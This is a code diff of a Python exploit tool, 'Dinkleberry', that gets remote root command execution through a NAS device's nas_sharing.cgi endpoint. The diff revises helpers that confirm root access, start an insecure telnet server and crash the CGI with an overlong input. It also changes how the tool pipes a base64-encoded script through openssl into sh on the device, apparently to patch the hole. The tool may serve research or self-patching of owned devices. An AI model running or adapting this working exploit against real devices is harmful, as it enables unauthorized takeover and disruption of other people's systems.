@@ -1,17 +1,18 @@
 import argparse
 import base64
 import logging
+from pathlib import Path
 import requests
 import urllib.parse
 
 
 logger = logging.getLogger(__name__)
-logger.setLevel(logging.DEBUG)
-fmt = logging.Formatter(fmt="%(asctime)s [%(levelname)9s] %(message)s")
+logger.setLevel(logging.INFO)
+fmt = logging.Formatter(fmt="%(asctime)s [%(levelname)8s] %(message)s")
 handler = logging.StreamHandler()
 handler.setFormatter(fmt=fmt)
 logger.addHandler(handler)
-logging.getLogger().setLevel(logging.DEBUG)
+logging.getLogger().setLevel(logging.INFO)
 
 regular_response = """<?xml version="1.0" encoding="UTF-8"?>
 <config><nas_sharing><auth_state>1</auth_state></nas_sharing></config>
@@ -34,11 +35,10 @@ class Dinkleberry:
                 "Forbidden character detected - will be escaped with a \\ character"
             )
 
-        logger.debug(f"Sending {" ".join(command)}")
+        logger.debug(f"Command: {" ".join(command)}")
         params = {
             "user": "messagebus",
             "passwd": "",
-            # "dbg": 1,
             "cmd": 15,
             "system": base64.b64encode("\t".join(command).encode()),
         }
@@ -49,46 +49,34 @@ class Dinkleberry:
         target_url = f"http://{self.host}/cgi-bin/nas_sharing.cgi"
         response = requests.get(target_url, params=params_str, headers=headers)
         response.raise_for_status()
-        return response
-
-    def run(self, command: list[str]) -> str:
-        response = self._perform_rce(command=command)
         if response.text.endswith(regular_response):
             trimmed = response.text[: -len(regular_response)]
-            logger.debug(trimmed)
-            return trimmed
-        raise RuntimeError("Error running command")
+            logger.debug(f"Output: {trimmed.strip()}")
+        return response
 
     def is_vulnerable(self) -> bool:
         response = self._perform_rce(command=["id"])
         return response.status_code == 200 and "root" in response.text
 
     def patch(self) -> None:
-        patch_command = [
-            "cp",
-            "/usr/local/modules/cgi/nas_sharing.cgi",
-            "/usr/local/config/nas_sharing_patched.cgi",
-        ]
-        self._perform_rce(command=patch_command)
-        patch_command = [
-            "printf",
-            "'\x00\xf0\x20\xe3\x00\xf0\x20\xe3'",  # problematic due to '
-            "|",
-            "dd",
-            "of=/usr/local/config/nas_sharing_patched.cgi",
-            "bs=1",
-            "seek=29984",
-            "count=8",
-            "conv=notrunk",
-        ]
-        self._perform_rce(command=patch_command)
-        patch_command = [
-            "ln",
-            "-s",
-            "/usr/local/config/nas_sharing_patched.cgi",
-            "/var/www/cgi-bin/nas_sharing.cgi",
-        ]
-        self._perform_rce(command=patch_command)
+        # The patch script contains all manner of forbidden characters, but we can
+        # work around this by simply b64 encoding it, then decoding it on the device
+        with open(Path(__file__).parent / "patch.sh") as f:
+            patch_script = f.read()
+        patch = base64.b64encode(patch_script.encode()).decode()
+
+        # Encoding with base64 pads the end of the output with '=' characters for
+        # alignment. However, = is a forbidden character. Just add more content to
+        # the file until there is no padding required.
+        while patch[-1] == "=":
+            logger.debug("Found '=' padding in b64 script, extending input")
+            patch_script += "\n"
+            patch = base64.b64encode(patch_script.encode()).decode()
+
+        # Pipe the encoded script file through openssl, and execute it
+        self._perform_rce(
+            command=["echo", patch, "|", "openssl", "base64", "-d", "|", "sh"]
+        )
 
     def start_telnet(self):
         logger.warning("Telnet is obviously very insecure. Kill it when you're done.")
@@ -98,12 +86,8 @@ class Dinkleberry:
         self._perform_rce(["killall", "utelnetd"])
 
     def buffer_overflow(self):
-        response = self._perform_rce([";" * 2047])
-        logger.debug(response.status_code)  # 200
-        logger.debug(response.text)  # Normal response
-        response = self._perform_rce([";" * 2100])
-        logger.debug(response.status_code)  # 200
-        logger.debug(response.text)  # No response because the CGI crashed
+        self._perform_rce([";" * 2047])  # Responds
+        self._perform_rce([";" * 2100])  # Empty response, when CGI crashes
 
 
 def main():
@@ -115,12 +99,34 @@ def main():
     parser.add_argument(
         "--kill-telnet", action="store_true", default=False, help="Stop telnet server"
     )
+    parser.add_argument(
+        "--test",
+        action="store_true",
+        default=False,
+        help="Test if device is vulnerable",
+    )
+    parser.add_argument(
+        "--verbose",
+        "-v",
+        action="store_true",
+        default=False,
+        help="Set this to print debug messages",
+    )
     args = parser.parse_args()
+
+    if args.verbose:
+        logger.setLevel(logging.DEBUG)
+        logging.getLogger().setLevel(logging.DEBUG)
 
     d = Dinkleberry(host=args.target)
 
     if not d.is_vulnerable():
         logger.info("Device not vulnerable")
+        exit(1)
+
+    logger.info("Device is vulnerable")
+    if args.test:
+        exit(0)
 
     if args.telnet:
         d.start_telnet()
